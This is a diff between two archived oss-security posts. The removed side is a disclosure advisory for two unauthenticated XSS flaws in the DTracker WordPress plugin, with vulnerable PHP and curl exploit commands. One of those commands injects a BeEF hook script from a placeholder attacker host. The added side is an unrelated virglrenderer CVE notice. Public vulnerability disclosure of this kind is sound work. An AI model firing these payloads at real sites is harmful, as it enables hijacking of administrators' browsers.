@@ -1,76 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/13/28
-Message-id: <21EB3BEF-79F8-4316-A1A4-87ED0A39A3E5@me.com>
-Date: Mon, 13 Mar 2017 16:01:57 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/13/2
+Message-ID: <alpine.LFD.2.20.1702131021590.18948@wniryva>
+Date: Mon, 13 Feb 2017 10:30:38 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+cc: Li Qiang <liqiang6-s@....cn>
+Subject: CVE-2017-5956 virglrenderer: Virglrenderer: OOB access while in vrend_draw_vbo
 Content-Type: text/plain; charset=utf-8
 
-Title: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-03-08
-CVE-ID:[CVE-2017-1002006][CVE-2017-1002007]
-Download Site: https://wordpress.org/plugins/dtracker/
-Vendor: https://profiles.wordpress.org/dijo/
-Vendor Notified: 2017-03-09
-Vendor Contact: plugins@...dpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=186
-Description: Track the details of the users downloading the pdf files from wordpress site.
+   Hello,
 
-Vulnerability:
-CVE-2017-1002006,
-In file dtracker/save_contact.php
+Virgil 3d project, used by Quick Emulator(Qemu) to implement 3D GPU support 
+for the virtio GPU, is vulnerable to an OOB array access issue. It could occur 
+when in vrend_draw_vbo.
 
-Doesn't check that the user is authorized before injecting new contacts into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.  
+A guest user/process could use this flaw to crash the Qemu process instance 
+resulting DoS.
 
-$name 		= $_POST['name'];
-	$company	= $_POST['company'];
-	$phone 		= $_POST['phone'];
-	$country	= $_POST['country'];
-	$contact_id = $_POST['contact_id'];
-	
-	$table 	= 'wp_contacts';
-	$data	= array(
-				'name'		=> $name,
-				'company'	=> $company,
-				'phone'		=> $phone,
-				'country'	=> $country,
-			);
-	$where	= array(
-				'id'	=> $contact_id
-			);
-	
-$wpdb->flush();
-	
-$wpdb->update( $table, $data, $where ); //Update the Contact
+Upstream patch:
+---------------
+   -> https://cgit.freedesktop.org/virglrenderer/commit/?id=a5ac49940c40ae415eac0cf912eac7070b4ba95d
 
-CVE-2017-1002007,
-In file dtracker/save_mail.php
+Reference:
+----------
+   -> https://bugzilla.redhat.com/show_bug.cgi?id=1421073
 
-Doesn't check that the user is authorized before injecting new emails into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.  
+This issue was reported by Li Qiang of 360.cn Inc.
 
+'CVE-2017-5956' assigned via -> https://cveform.mitre.org/
 
-$email 	= $_POST['email'];
-	$time	= date('Y-m-d H:i:s');
-	$ip		= $_SERVER [ 'REMOTE_ADDR' ] ; //get IP address of the visitor
-	
-	$table 	= "wp_contacts";
-	$data	= array (
-				'email' 	=> $email,
-				'time'		=> $time,
-				'ip'		=> $ip	
-			);
-	
-	$wpdb->insert( $table, $data); //Insert Values
-	$contact_id = $wpdb->insert_id; //Get ID of the last inserted row
-	$data['contactId'] = $contact_id;
-	echo json_encode($data); //Pass the id to the JS
-
-Exploit Code:
-	• $ curl --data "email=\"><script>alert(1);</script>" http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php
-	• {"email":"\\\"><script>alert(1);<\/script>","time":"2017-03-09 00:54:06","ip":"example.com","contactId":10577}
-	•  
-	• Or better yet, inject a BeEF hook.
-	•  
-	• $ curl --data 'email="><script src=http://BeEF_Host:3000/hook.js></script>' http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
